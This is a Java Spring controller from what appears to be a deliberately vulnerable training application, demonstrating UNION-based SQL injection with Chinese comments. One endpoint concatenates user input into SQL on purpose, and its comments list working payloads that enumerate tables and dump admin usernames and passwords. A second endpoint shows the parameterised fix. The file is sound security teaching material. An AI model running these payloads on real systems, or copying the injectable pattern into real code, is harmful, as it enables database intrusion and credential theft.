package icu.secnotes.controller.SQLI;

import icu.secnotes.pojo.Article;
import icu.secnotes.pojo.Result;
import io.swagger.v3.oas.annotations.tags.Tag;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.*;
import java.sql.*;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * UNION 联合注入漏洞演示
 * 
 * 场景：文章详情查询
 * 
 * ⚠️ UNION 注入特点：
 * 1. 页面有明确的数据回显（能看到查询结果）
 * 2. 使用 UNION 操作符合并多个 SELECT 结果集
 * 3. 可以一次性获取大量敏感数据（相比布尔盲注效率高）
 * 4. 是 SQL 注入中最经典、最直接的类型
 * 
 * UNION 注入 vs 布尔盲注：
 * - UNION 注入：页面直接显示数据，1次请求获取完整数据（快）
 * - 布尔盲注：页面只返回真/假，需要数百次请求逐字符猜测（慢）
 * 
 * 攻击步骤：
 * 1. 判断注入点（测试单引号）
 * 2. 判断列数（ORDER BY）
 * 3. 确定回显位置（UNION SELECT 1,2,3...）
 * 4. 获取数据库信息（database(), user(), version()）
 * 5. 获取表名（information_schema.tables）
 * 6. 获取列名（information_schema.columns）
 * 7. 获取敏感数据（SELECT ... FROM admin）
 */
@Slf4j
@RequestMapping("/sqli/union")
@RestController
@CrossOrigin
@Tag(name = "UNION联合注入", description = "UNION类型的SQL注入漏洞演示")
public class UnionInjectionController {

    @Value("${spring.datasource.url}")
    private String db_url;

    @Value("${spring.datasource.username}")
    private String db_user;

    @Value("${spring.datasource.password}")
    private String db_pass;

    /**
     * UNION 注入 - 漏洞版本（字符串拼接）
     * 
     * 场景：根据文章 ID 查询文章详情
     * 漏洞：直接拼接 SQL，允许使用 UNION 操作符注入额外查询
     * 
     * @Poc1（正常查询）: http://127.0.0.1:8080/sqli/union/getArticleVuln?id=1
     *       返回: 文章标题、作者、内容等
     * 
     * @Poc2（测试注入点）: id=1'
     *       返回: SQL 语法错误（说明存在注入点）
     * 
     * @Poc3（判断列数）: id=1 ORDER BY 5
     *       返回: 正常（说明有5列）
     *       id=1 ORDER BY 6
     *       返回: 错误（说明只有5列）
     * 
     * @Poc4（确定回显位置）: id=-1 UNION SELECT 1,2,3,4,5
     *       返回: 页面显示 2,3,4,5 的位置（第1列 id 可能不显示）
     * 
     * @Poc5（获取数据库信息）: id=-1 UNION SELECT 1,database(),user(),version(),5
     *       返回: 数据库名、当前用户、MySQL版本
     * 
     * @Poc6（获取所有表名）: 
     *       id=-1 UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()
     *       返回: Admin,MessageBoard,User,articles... 等表名
     * 
     * @Poc7（获取 admin 表的列名）:
     *       id=-1 UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name='admin'
     *       返回: id,name,username,password,token,avatar,role...
     * 
     * @Poc8（获取 admin 表的敏感数据）:
     *       id=-1 UNION SELECT 1,username,password,avatar,5 FROM admin
     *       返回: 所有管理员的用户名和密码（明文）
     * 
     * @param id 文章ID
     * @return 文章详情
     */
    @GetMapping("/getArticleVuln")
    public Result getArticleVuln(String id) {
        Connection conn = null;
        Statement statement = null;
        ResultSet resultSet = null;
        
        try {
            // 1. 注册驱动
            Class.forName("com.mysql.cj.jdbc.Driver");
            
            // 2. 获取连接
            conn = DriverManager.getConnection(db_url, db_user, db_pass);
            
            // 3. ❌ 拼接 SQL（漏洞点）
            String sql = "SELECT id, title, author, content, create_time FROM articles WHERE id = " + id;
            
            log.warn("【UNION注入漏洞】执行SQL: {}", sql);
            
            // 4. 执行查询
            statement = conn.createStatement();
            resultSet = statement.executeQuery(sql);
            
            // 5. 处理结果
            List<Map<String, Object>> results = new ArrayList<>();
            while (resultSet.next()) {
                Map<String, Object> article = new HashMap<>();
                
                // 尝试获取所有5列数据
                try {
                    article.put("id", resultSet.getObject(1));
                    article.put("title", resultSet.getObject(2));
                    article.put("author", resultSet.getObject(3));
                    article.put("content", resultSet.getObject(4));
                    article.put("create_time", resultSet.getObject(5));
                } catch (SQLException e) {
                    // 如果列数不匹配，尝试动态获取
                    ResultSetMetaData metaData = resultSet.getMetaData();
                    int columnCount = metaData.getColumnCount();
                    for (int i = 1; i <= columnCount; i++) {
                        article.put(metaData.getColumnName(i), resultSet.getObject(i));
                    }
                }
                
                results.add(article);
            }
            
            Map<String, Object> data = new HashMap<>();
            data.put("sql", sql);
            data.put("results", results);
            
            // ✅ 无论是否找到文章，都返回成功（code=0），让前端根据 results 是否为空来判断
            log.warn("【UNION注入漏洞】查询成功，返回 {} 条记录", results.size());
            return Result.success(data);
            
        } catch (Exception e) {
            log.error("【UNION注入漏洞】执行失败: {}", e.getMessage());
            // ⚠️ 漏洞加剧：返回详细错误信息（可能暴露数据库结构）
            Map<String, Object> errorData = new HashMap<>();
            errorData.put("error", e.getMessage());
            errorData.put("sql", "SELECT id, title, author, content, create_time FROM articles WHERE id = " + id);
            return Result.error("查询失败：" + e.getMessage());
        } finally {
            // 6. 关闭资源
            try {
                if (resultSet != null) resultSet.close();
                if (statement != null) statement.close();
                if (conn != null) conn.close();
            } catch (SQLException e) {
                log.error("关闭连接失败", e);
            }
        }
    }

    /**
     * UNION 注入 - 安全版本（预编译）
     * 
     * 防御方法：使用 PreparedStatement 预编译 + 参数绑定
     * 原理：SQL 结构在编译时确定，用户输入仅作为数据值，无法注入 UNION 等关键字
     * 
     * @param id 文章ID
     * @return 文章详情
     */
    @GetMapping("/getArticleSec")
    public Result getArticleSec(String id) {
        Connection conn = null;
        PreparedStatement preparedStatement = null;
        ResultSet resultSet = null;
        
        try {
            // 1. 注册驱动
            Class.forName("com.mysql.cj.jdbc.Driver");
            
            // 2. 获取连接
            conn = DriverManager.getConnection(db_url, db_user, db_pass);
            
            // 3. ✅ 使用预编译（安全点）
            String sql = "SELECT id, title, author, content, create_time FROM articles WHERE id = ?";
            
            log.info("【安全】执行SQL: {}, 参数: {}", sql, id);
            
            // 4. 参数绑定
            preparedStatement = conn.prepareStatement(sql);
            preparedStatement.setString(1, id);  // UNION 等关键字会被转义为普通字符串
            
            // 5. 执行查询
            resultSet = preparedStatement.executeQuery();
            
            // 6. 处理结果
            List<Map<String, Object>> results = new ArrayList<>();
            while (resultSet.next()) {
                Map<String, Object> article = new HashMap<>();
                article.put("id", resultSet.getInt("id"));
                article.put("title", resultSet.getString("title"));
                article.put("author", resultSet.getString("author"));
                article.put("content", resultSet.getString("content"));
                article.put("create_time", resultSet.getTimestamp("create_time"));
                results.add(article);
            }
            
            Map<String, Object> data = new HashMap<>();
            data.put("sql", sql + " (参数: " + id + ")");
            data.put("results", results);
            
            // ✅ 无论是否找到文章，都返回成功（code=0），让前端根据 results 是否为空来判断
            log.info("【安全】查询成功，返回 {} 条记录", results.size());
            return Result.success(data);
            
        } catch (Exception e) {
            log.error("【安全】执行失败: {}", e.getMessage());
            // ✅ 安全实践：不返回详细错误信息
            return Result.error("查询失败，请稍后重试");
        } finally {
            // 7. 关闭资源
            try {
                if (resultSet != null) resultSet.close();
                if (preparedStatement != null) preparedStatement.close();
                if (conn != null) conn.close();
            } catch (SQLException e) {
                log.error("关闭连接失败", e);
            }
        }
    }
}
